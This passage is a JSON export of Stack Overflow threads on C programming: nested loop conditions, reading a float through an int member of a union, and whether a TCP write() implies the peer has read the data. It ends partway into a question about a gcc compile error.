"registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": true, "score": 0, "last_activity_date": 1518590558, "creation_date": 1518590558, "answer_id": 48781144, "question_id": 48780997, "link": "https://stackoverflow.com/questions/48780997/nested-for-loops-operator-should-not-work/48781144#48781144", "title": "Nested for loops &lt; operator should not work", "body": "<pre><code>i = 0\n    j = 0, break out of loop\ni = 1\n    j = 0, print #\n    j = 1, break out of loop\ni = 2\n    j = 0, print #\n    j = 1, print #\n    j = 2, break out of loop\ni = 3\n    j = 0, print #\n    j = 1, print #\n    j = 2, print #\n    j = 3, break out of loop\ni = 4\n    j = 0, print #\n    j = 1, print #\n    j = 2, print #\n    j = 3, print #\n    j = 4, break out of loop\ni = 5, break out of loop\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "edited": false, "score": 0, "creation_date": 1518591484, "post_id": 48781295, "comment_id": 84564011, "body": "it works, only with a blank line in the beginning"}, {"owner": {"reputation": 2955, "user_id": 3819007, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6hvpZ.png?s=128&g=1", "display_name": "visibleman", "link": "https://stackoverflow.com/users/3819007/visibleman"}, "reply_to_user": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "edited": false, "score": 0, "creation_date": 1518591782, "post_id": 48781295, "comment_id": 84564115, "body": "@ThisNameWasTaken, yes but the inner loop does not execute on the first iteration, because i=0 is not less than j=0 thus no # is printed."}], "tags": [], "owner": {"reputation": 2955, "user_id": 3819007, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6hvpZ.png?s=128&g=1", "display_name": "visibleman", "link": "https://stackoverflow.com/users/3819007/visibleman"}, "is_accepted": false, "score": 0, "last_activity_date": 1518591804, "last_edit_date": 1518591804, "creation_date": 1518591259, "answer_id": 48781295, "question_id": 48780997, "link": "https://stackoverflow.com/questions/48780997/nested-for-loops-operator-should-not-work/48781295#48781295", "title": "Nested for loops &lt; operator should not work", "body": "<p>As others pointed out, it doesn't work (the way you are expecting it to). One way to see what is going on:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    for(int i = 0; i &lt;= 4; i++){\n        printf(\"%d&gt;\",i);\n        for(int j = 0; j &lt; i; j++){\n            printf(\"#\");\n        }\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 1, "last_activity_date": 1518591424, "creation_date": 1518591424, "answer_id": 48781332, "question_id": 48780997, "link": "https://stackoverflow.com/questions/48780997/nested-for-loops-operator-should-not-work/48781332#48781332", "title": "Nested for loops &lt; operator should not work", "body": "<p>To print out a 4-high pyramid without a leading blank line</p>\n\n<pre><code>int main()\n{\n    for (int i = 0; i &lt; 4; i++) {\n        for (int j = 0; j &lt;= i; j++) {\n            printf(\"#\");\n        }\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 828, "user_id": 7528968, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lBrrI.jpg?s=128&g=1", "display_name": "Aniruddh Agarwal", "link": "https://stackoverflow.com/users/7528968/aniruddh-agarwal"}, "is_accepted": false, "score": 0, "last_activity_date": 1518591841, "creation_date": 1518591841, "answer_id": 48781436, "question_id": 48780997, "link": "https://stackoverflow.com/questions/48780997/nested-for-loops-operator-should-not-work/48781436#48781436", "title": "Nested for loops &lt; operator should not work", "body": "<p>your code </p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    for(int i = 0; i &lt;= 4; i++){\n        for(int j = 0; j &lt; i; j++){\n            printf(\"#\");\n        }\n       printf(\"\\n\");\n    }\n}\n</code></pre>\n\n<p>is working as it should work. The first # is printed when i = 1 and j=0. So, you are somewhere misunderstanding the concept of for loop in c.\nIn C language, first the initialization i.e first argument is called and then the second argument that is loop control is accessed and if condition is true then the loop is accessed.</p>\n"}], "owner": {"reputation": 71, "user_id": 7327892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9e577fa7eab60208e6a77e37614143e?s=128&d=identicon&r=PG&f=1", "display_name": "ThisNameWasTaken", "link": "https://stackoverflow.com/users/7327892/thisnamewastaken"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "closed_date": 1518612453, "accepted_answer_id": 48781144, "answer_count": 4, "score": 1, "last_activity_date": 1518591841, "creation_date": 1518589870, "question_id": 48780997, "link": "https://stackoverflow.com/questions/48780997/nested-for-loops-operator-should-not-work", "closed_reason": "Needs details or clarity", "title": "Nested for loops &lt; operator should not work", "body": "<p>I have to create the half of a pyramid in C, and it works, but I dont understand why in the second loop when I evaluate j &lt; i still execute the code in the curly braces, if j = 0 and i = 0, they are equal, so i is no greater than \nj...so what's the difference between using &lt; and &lt;= in this case?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    for(int i = 0; i &lt;= 4; i++){\n        for(int j = 0; j &lt; i; j++){\n            printf(\"#\");\n        }\n       printf(\"\\n\");\n    }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1518590885, "post_id": 48780994, "comment_id": 84563740, "body": "This is how a <code>union</code> works: All components share the same storage. Hence, if you assign one of them the others may not be used (or at least with certain restrictions only -&gt; <a href=\"https://en.wikipedia.org/wiki/Type_punning\" rel=\"nofollow noreferrer\">type punning</a>)."}, {"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 1, "creation_date": 1518591094, "post_id": 48780994, "comment_id": 84563831, "body": "I think its this way, whatever you assign to any member of a union you can see the value interpreted in member&#39;s ways. Changes done on one will be reflected in all as the storage is same."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1518591168, "post_id": 48780994, "comment_id": 84563875, "body": "If you want to convert <code>float</code> to <code>int</code> then use <code>float spirit = 5.4; int body = (int)spirit;</code> (without <code>union</code>). The value <code>1085066445</code> shows how the 32 bits of <code>float spirit;</code> would &quot;look like&quot; when interpreted as <code>int</code> value. If you find this confusing, please, have a look at <a href=\"http://steve.hollasch.net/cgindex/coding/ieeefloat.html\" rel=\"nofollow noreferrer\">IEEE Standard 754 Floating Point Numbers</a>."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1518591206, "post_id": 48780994, "comment_id": 84563889, "body": "@Scheff: No need to cast in C."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1518591260, "post_id": 48780994, "comment_id": 84563910, "body": "@alk Well, it&#39;s done implicitly as well. But, for pedagogical reasons it might be acceptable in this case... ;-)"}], "answers": [{"comments": [{"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "edited": false, "score": 0, "creation_date": 1518591407, "post_id": 48781265, "comment_id": 84563981, "body": "So can I assume that a value stored in any 4 byte storage in a machine, is just 1 step of representing that float value. Rest of the part, like getting to the actual value is different in hardware ways?"}, {"owner": {"reputation": 15050, "user_id": 8605791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ae3be140b26db13a86d624dba4ef1c8?s=128&d=identicon&r=PG&f=1", "display_name": "llllllllll", "link": "https://stackoverflow.com/users/8605791/llllllllll"}, "reply_to_user": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "edited": false, "score": 0, "creation_date": 1518591525, "post_id": 48781265, "comment_id": 84564020, "body": "No. It is the whole part, but they are represented by different and irrelevant standards, so the results are not mutually interpretable."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "edited": false, "score": 0, "creation_date": 1518591676, "post_id": 48781265, "comment_id": 84564081, "body": "@nikhilchaubey: Bits in memory are just bits in memory. They are not inherently <code>float</code> values or <code>int</code> values. They only have meaning when we choose to interpret them in a particular way. Normally, the compiler does this for you. When you define <code>int x</code>, the compiler sets aside some storage for an <code>int</code> and automatically interprets the bits using the <code>int</code> format whenever you read it. When you declare <code>float x</code>, the compiler automatically interprets them using the <code>float</code> format. When you use a union, you tell the compiler to write one way and interpret another."}], "tags": [], "owner": {"reputation": 15050, "user_id": 8605791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ae3be140b26db13a86d624dba4ef1c8?s=128&d=identicon&r=PG&f=1", "display_name": "llllllllll", "link": "https://stackoverflow.com/users/8605791/llllllllll"}, "is_accepted": false, "score": 2, "last_activity_date": 1518591668, "last_edit_date": 1518591668, "creation_date": 1518591108, "answer_id": 48781265, "question_id": 48780994, "link": "https://stackoverflow.com/questions/48780994/float-and-int-members-in-a-union-does-not-show-values/48781265#48781265", "title": "Float and int members in a union does not show values", "body": "<p>For most of the implementation, <code>int</code> and <code>float</code> use essentially different representation in terms of bit. If you interpret the same bit sequence in <code>float</code> as <code>int</code>, the result is meaningless. You can't expect a <code>float</code> representation of <code>5.4</code> is also a <code>int</code> representation of <code>5</code>.</p>\n\n<p>See <a href=\"https://en.wikipedia.org/wiki/Floating-point_arithmetic#Internal_representation\" rel=\"nofollow noreferrer\">here</a> some typical implementation of <code>floating point</code>, and <a href=\"https://en.wikipedia.org/wiki/Two%27s_complement\" rel=\"nofollow noreferrer\">here</a> a typical representation of <code>int</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1518591436, "post_id": 48781305, "comment_id": 84563994, "body": "Even got the hidden-bit part, that&#39;s a whole lot in one paragraph <code>:)</code>"}, {"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "edited": false, "score": 0, "creation_date": 1518593237, "post_id": 48781305, "comment_id": 84564794, "body": "I understand now its interpretation done by IEEE. This site also tells a nice way to do same, <a href=\"http://www.log2base2.com/storage/how-float-values-are-stored-in-memory.html\" rel=\"nofollow noreferrer\">log2base2.com/storage/&hellip;</a>"}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 3, "last_activity_date": 1518591323, "creation_date": 1518591323, "answer_id": 48781305, "question_id": 48780994, "link": "https://stackoverflow.com/questions/48780994/float-and-int-members-in-a-union-does-not-show-values/48781305#48781305", "title": "Float and int members in a union does not show values", "body": "<p>The value in a float is stored in a special format. In the most common format, it is encoded with one bit for a sign, eight bits for an exponent, and 23 bits for the significand (a fraction). For 5.4, the sign bit is 0 (for positive), the exponent is 2 and is encoded as 129 (127 is added; the exponent is stored with a bias), and the fraction is 1.35000002384185791015625, using the bits 0x2ccccd. (Those are the fraction minus one, then multiplied by 2<sup>23</sup>.) Put together, the sign bit, the exponent bits, and the significand bits form 0x40accccd. In decimal, that is 1085066445.</p>\n\n<p>So, when you store 5.4 in the <code>float</code> member of the union, the bits 0x40accccd are written to the storage. When you read the <code>int</code> member, those bits are interpreted as 1085066445.</p>\n"}], "owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1306, "favorite_count": 0, "accepted_answer_id": 48781305, "answer_count": 2, "score": 2, "last_activity_date": 1518591668, "creation_date": 1518589863, "question_id": 48780994, "link": "https://stackoverflow.com/questions/48780994/float-and-int-members-in-a-union-does-not-show-values", "title": "Float and int members in a union does not show values", "body": "<p>I am trying to understand union and here is a example code I wrote,</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nunion god{\n    int body;\n    float spirit;\n};\n\nunion god human;\n\nint main(void)\n{\n    float malice = 5.4;\n    human.spirit = malice;\n    printf(\"%ld %ld\\n\", sizeof(float), sizeof(int));\n    printf(\"%d %f\\n\", human.body, human.spirit);\n    return 0;\n}\n</code></pre>\n\n<p>I expected 5 5.4 as output, because same memory is used for int and float types, I should be able to store both in same place.</p>\n\n<p>However printing those values doesn't show my guess.</p>\n\n<pre><code>4 4\n1085066445 5.400000\n</code></pre>\n\n<p>Output does not show both values as <strong>5 5.4</strong>.</p>\n\n<p>int and float both have same size, so same memory is used for holding them.</p>\n\n<p>1.But why the output is like this?</p>\n\n<p>2.Am I missing some float, union, printf related basics?</p>\n"}, {"tags": ["c", "sockets", "tcp", "network-programming"], "answers": [{"comments": [{"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518590086, "post_id": 48780861, "comment_id": 84563417, "body": "<i>&quot;It may be blocked trying to exit your machine due to a broken cable, it may be blocked at a bottleneck in the path somewhere&quot;</i> -- this is not possible since the returning from <code>write()</code> means the TCP ACK has already been received. so it&#39;s more like the pipe is between the peer&#39;s kernel and app."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 1, "creation_date": 1518590202, "post_id": 48780861, "comment_id": 84563475, "body": "@pynexj It means nothing of the kind. Are you asking or telling?"}, {"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518590618, "post_id": 48780861, "comment_id": 84563644, "body": "as i commented in EJP&#39;s answer, my understanding is it&#39;s reached the peer&#39;s kernel. what i don&#39;t know is if the peer&#39;s app has called read(). sounds like my whole understanding is wrong."}, {"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518590743, "post_id": 48780861, "comment_id": 84563692, "body": "sorry i did not realize it&#39;s EJP asking here. :)"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 2, "creation_date": 1518591348, "post_id": 48780861, "comment_id": 84563956, "body": "To add to what @EJP has already correctly explained, think about what would happen to download rates if every write() call had to wait until peer receipt ACK before returning.  Imagine a high bandwidth, but also high latency, connection, eg. a satellite link..."}], "tags": [], "owner": {"reputation": 767708, "user_id": 14860, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vXG1F.png?s=128&g=1", "display_name": "paxdiablo", "link": "https://stackoverflow.com/users/14860/paxdiablo"}, "is_accepted": false, "score": 3, "last_activity_date": 1518593422, "last_edit_date": 1518593422, "creation_date": 1518589230, "answer_id": 48780861, "question_id": 48780811, "link": "https://stackoverflow.com/questions/48780811/for-tcp-does-returning-from-write-mean-that-the-peer-app-has-read-the-d/48780861#48780861", "title": "For TCP, does returning from &quot;write()&quot; mean that the peer app has &quot;read()&quot; the data?", "body": "<p>No. If you think of it as a data pipe, returning from <code>write</code> means that your data has <em>entered</em> the pipe, <em>not</em> that it has exited the pipe at the other end.</p>\n\n<p>In fact, since the pipe is one where the data may take any of hundreds of different pathways, you're not even guaranteed that it <em>will</em> reach the other end :-) If that happens, you'll be notified about it at some later date, probably by a <em>subsequent</em> <code>write</code> failing.</p>\n\n<p>It may be blocked:</p>\n\n<ul>\n<li>trying to exit your machine due to a broken cable,</li>\n<li>at a bottleneck in the path somewhere,</li>\n<li>by the networking stack at the destination,</li>\n<li>by a networking stack at some device in the networking path, more intelligent than a simple hub,</li>\n<li>because the application at the other end is otherwise tied up,</li>\n<li>and so on.</li>\n</ul>\n\n<p>A successful return from <code>write</code> means that your <em>local</em> network stack has accepted your data and will process it in due course.</p>\n"}, {"comments": [{"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518590250, "post_id": 48781030, "comment_id": 84563498, "body": "<i>&quot;the data has reached <b>your</b> kernel&quot;</i> -- u mean returning from write() only means the data has reached the <b><i>sender</i></b>&#39;s kernel? i&#39;d think the sender&#39;s already received the TCP ACK so reached the peer&#39;s kernel."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 1, "creation_date": 1518590333, "post_id": 48781030, "comment_id": 84563534, "body": "@pynexj You are mistaken. There is no guarantee that the data has even been sent, let alone ACK&#39;d. If you think you know the answer why are you asking the question?"}, {"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518590535, "post_id": 48781030, "comment_id": 84563617, "body": "not that i know the answer. my understanding is it&#39;s reached the peer&#39;s kernel. what i don&#39;t know is if the peer&#39;s app has called read(). sounds like my whole understanding is wrong."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518592319, "post_id": 48781030, "comment_id": 84564366, "body": "@pynexj Returning from <code>write</code> means that the sender was able to store the data in transmit butter. If the buffer is full, <code>write</code> will be blocked and return a bit later. Otherwise it will return immediately. Your <code>write</code> call would also return successfull if the peer burnt to ashes straight after accepting the connection."}, {"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518592438, "post_id": 48781030, "comment_id": 84564417, "body": "yes thank you all. i found the info from the posix standard. added to my question for easy reference for others."}, {"owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 0, "creation_date": 1518592725, "post_id": 48781030, "comment_id": 84564558, "body": "a bit out of topic, anyone can help translate <i>&quot;No indication of failure to deliver is implicit in a send()&quot;</i> (from send()&#39;s man page on linux) into simple English?"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "edited": false, "score": 1, "creation_date": 1518594421, "post_id": 48781030, "comment_id": 84565348, "body": "@pynexj I agree with you. It is a poorly worded and most obscure statement. What they are trying to say is that failure to deliver <i>this</i> data won&#39;t necessarily be indicated as a return value/<code>errno</code> of <i>this</i> invocation of <code>send()</code>, due to buffering and all the other malarkey. You will eventually get an error, on a subsequent <code>send()</code> or <code>recv()</code>, relating to this data, but it may take some time. Why they didn&#39;t just adapt the Posix text, or the original BSD text, is another mystery."}], "tags": [], "owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "is_accepted": true, "score": 3, "last_activity_date": 1518590706, "last_edit_date": 1518590706, "creation_date": 1518589984, "answer_id": 48781030, "question_id": 48780811, "link": "https://stackoverflow.com/questions/48780811/for-tcp-does-returning-from-write-mean-that-the-peer-app-has-read-the-d/48781030#48781030", "title": "For TCP, does returning from &quot;write()&quot; mean that the peer app has &quot;read()&quot; the data?", "body": "<blockquote>\n  <p>I'm wondering if it could possibly deadlock if the client and server coincidentally write to the peer at the same time.</p>\n</blockquote>\n\n<p>It can't, unless one or both of the peers is very slow reading and has closed its receive window. TCP is full-duplex.</p>\n\n<blockquote>\n  <p>So does returning from write() mean that the peer application has already read() the data?</p>\n</blockquote>\n\n<p>No.</p>\n\n<blockquote>\n  <p>Or it only means the peer's kernel has got the data and would deliver to the app on next read()?</p>\n</blockquote>\n\n<p>No.</p>\n\n<p>It means the data has reached <em>your</em> kernel, and is queued for transmission.</p>\n\n<blockquote>\n  <p>the returning from write() means the TCP ACK has already been received.</p>\n</blockquote>\n\n<p>No it doesn't.</p>\n\n<blockquote>\n  <p>u mean returning from write() only means the data has reached the sender's kernel?</p>\n</blockquote>\n\n<p>That is not only what I meant, it is what I said.</p>\n\n<blockquote>\n  <p>I'd think the sender's already received the TCP ACK so reached the peer's kernel.</p>\n</blockquote>\n\n<p>No.</p>\n"}], "owner": {"reputation": 14947, "user_id": 900078, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/83stK.jpg?s=128&g=1", "display_name": "pynexj", "link": "https://stackoverflow.com/users/900078/pynexj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "accepted_answer_id": 48781030, "answer_count": 2, "score": 1, "last_activity_date": 1518593422, "creation_date": 1518589063, "last_edit_date": 1518592394, "question_id": 48780811, "link": "https://stackoverflow.com/questions/48780811/for-tcp-does-returning-from-write-mean-that-the-peer-app-has-read-the-d", "title": "For TCP, does returning from &quot;write()&quot; mean that the peer app has &quot;read()&quot; the data?", "body": "<p>I'm writing a C/S program and both the client and server may send data  to peer (without explicit ack) at arbitrary time. I'm wondering if it could possibly deadlock if the client and server coincidentally write to the peer at the same time.</p>\n\n<p>So does returning from <code>write()</code> mean that the peer application has already <code>read()</code> the data? Or it only means the peer's kernel has got the data and would deliver to the app on next <code>read()</code>?</p>\n\n<hr>\n\n<p>(EJP's answer fixed my totally wrong understanding about <code>write()/send()/...</code>. To add some authoritative info I found this in the POSIX standard about <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/send.html\" rel=\"nofollow noreferrer\"><code>send</code></a>:</p>\n\n<blockquote>\n  <p>Successful completion of a call to send() <strong>does not guarantee delivery of the message</strong>. A return value of -1 indicates only locally-detected errors.</p>\n</blockquote>\n\n<p>Linux's man page about <code>send()</code> is not very clear:</p>\n\n<blockquote>\n  <p>No indication of failure to deliver is implicit in a send().  Locally detected errors are indicated by a return value of -1.</p>\n</blockquote>\n\n<p>Or it's because I cannot fully understand the first sentence as a non native English speaker. )</p>\n"}, {"tags": ["c", "gcc", "compiler-errors", "gcc-4.2"], "comments": [{"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1518587591, "post_id": 48780403, "comment_id": 84562447, "body": "You have a rogue character, it&#39;s even visible in the question. It&#39;s that cross over there..."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1518588714, "post_id": 48780403, "comment_id": 84562835, "body": "Please do not post screen-shots. Better copypaste console output into your question."}, {"owner": {"reputation": 55, "user_id": 2432020, "user_type": "registered", "accept_rate": 43, "profile_image": 